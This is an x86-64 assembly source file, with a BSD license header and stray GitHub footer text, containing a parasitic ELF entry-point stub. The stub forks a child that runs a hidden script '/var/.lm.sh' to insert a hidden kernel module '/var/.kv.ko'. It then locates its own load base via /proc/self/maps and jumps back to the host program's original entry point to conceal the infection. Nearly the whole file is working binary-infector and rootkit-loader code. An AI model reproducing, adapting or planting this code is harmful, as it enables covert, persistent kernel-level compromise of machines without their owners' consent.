#   BSD 3-Clause License
#
#   Copyright (c) 2024, Carlos Carvalho
#   All rights reserved.
#
#   Redistribution and use in source and binary forms, with or without
#   modification, are permitted provided that the following conditions are met:
#
#   1. Redistributions of source code must retain the above copyright notice, this
#      list of conditions and the following disclaimer.
#
#   2. Redistributions in binary form must reproduce the above copyright notice,
#      this list of conditions and the following disclaimer in the documentation
#      and/or other materials provided with the distribution.
#
#   3. Neither the name of the copyright holder nor the names of its
#      contributors may be used to endorse or promote products derived from
#      this software without specific prior written permission.
#
#   THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
#   AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
#   IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
#   DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
#   FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
#   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
#   SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
#   CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
#   OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
#   OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#   © 2022 GitHub, Inc.
#   Terms
#   Privacy
#   Security

.globl _start

.equ SYS_read,      0
.equ SYS_write,     1
.equ SYS_open,      2
.equ SYS_fork,      57
.equ SYS_execve,    59
.equ    MAXLEN,     17

.text

_start:
    push %rax                       # 50                       ;    save registers
    push %rcx                       # 51
    push %rdx                       # 52
    push %rsi                       # 56
    push %rdi                       # 57
    push %r11                       # 41 53

    mov $SYS_fork, %eax             # b8 39 00 00 00           ;    Call sys_execve soon
    syscall                         # 0f 05                    ;    and for so, sys_fork is required first
    cmp $0, %eax                    # 83 f8 00                 ;    otherwise the flow breaks

    jne fuckoff                     # 75 31                    ;    jne 0x00000044

    leaq modname(%rip), %rax        # 48 8d 05 b9 00 00 00     ;    lea 0xb9(%rip),%rax  0x000000d3     # 2nd argument for execve: module name
    leaq insmodwrapper(%rip), %rdi  # 48 8d 3d a6 00 00 00     ;    lea 0xa6(%rip),%rdi  0x000000c7     # 1st argument

    xor %rdx, %rdx                  # 48 31 d2                 ;    prepare to push args onto stack
    pushq %rdx                      # 52
    pushq %rax                      # 50
    pushq %rdi                      # 57
    movq %rsp, %rsi                 # 48 89 e6

    movq $SYS_execve, %rax          # 48 c7 c0 3b 00 00 00     ;    execute loadmodule script
    leaq insmodwrapper(%rip), %rdi  # 48 8d 3d 8f 00 00 00     ;    0x000000c7
    movq $0, %rdx                   # 48 c7 c2 00 00 00 00
    syscall                         # 0f 05

    xor %rax, %rax                  # 48 31 c0

fuckoff:
    movl $SYS_open, %eax            # b8 02 00 00 00           ;    R/O open maps file
    leaq path(%rip), %rdi           # 48 8d 3d 8f 00 00 00     ;    0x000000df
    movq $0, %rsi                   # 48 c7 c6 00 00 00 00
    syscall                         # 0f 05

    subq $16, %rsp                  # 48 83 ec 10              ;    reserve stack for buffer

    movq %rax, %rdi                 # 48 89 c7                 ;    read up to MAXLEN bytes
    movl $SYS_read, %eax            # b8 00 00 00 00
    movq %rsp, %rsi                 # 48 89 e6
    movq $MAXLEN, %rdx              # 48 c7 c2 11 00 00 00
    syscall                         # 0f 05

scan:                               #                          ;    scan the buffer for the fist '-' character
    movq $MAXLEN+1, %rcx            # 48 c7 c1 12 00 00 00     ;    initialize counter
    movb $'-', %al                  # b0 2d                    ;    store the wild-card in %al byte
    movq %rsp, %rdi                 # 48 89 e7
    cld                             # fc
    repne scasb                     # f2 ae

    movq $MAXLEN, %r13              # 49 c7 c5 11 00 00 00     ;    rcx = (MAXLEN-rcx)
    subq %rcx, %r13                 # 49 29 cd
    movq %r13, %rcx                 # 4c 89 e9

    xor %rbx, %rbx                  # 48 31 db                 ;    prepare to read from the result buffer
    movq %rsp, %rsi                 # 48 89 e6
    movq %rsi, %rdi                 # 48 89 f7
    cld                             # fc
readchars:                          #                          ;    convert result to hex absolute
    lodsb                           # ac
    cmpb $0x39, %al                 # 3c 39                    ;    if it is a digit, jmp and extract
    jle digit                       # 7e 04
alpha:
    subb $0x57, %al                 # 2c 57                    ;    it is alpha
    jmp load_ebx                    # eb 02
digit:
    subb $0x30, %al                 # 2c 30                    ;    it is digit
load_ebx:
    shl $4, %rbx                    # 48 c1 e3 04
    or %rax, %rbx                   # 48 09 c3
    stosb                           # aa
    loop readchars                  # e2 eb

    addq $16, %rsp                  # 48 83 c4 10              ;   at this point %rbx holds the offset, realign %rsp
                                    #                          ;   dummy jmp address, is overwritten at run-time with the actual entry point
    movq $0x1122334455667788, %r8   # 49 b8 88 77 66 55 44 3   ;   3 22 11  $0x1122334455667788

    addq %rbx, %r8                  # 49 01 d8                 ;   store offset value in %r8

    pop %r11                        # 41 5b                    ;   restore registers
    pop %rdi                        # 5f
    pop %rsi                        # 5e
    pop %rdx                        # 5a
    pop %rcx                        # 59
    pop %rax                        # 58

    jmpq *%r8                       # 41 ff e0                 ;   jmp to address stored

    # wrapper for insmod and module name
    insmodwrapper:      .asciz "/var/.lm.sh"

    # rename this to real name
    modname:              .asciz "/var/.kv.ko"

    # This is so I can find myself
    path:               .asciz "/proc/self/maps"


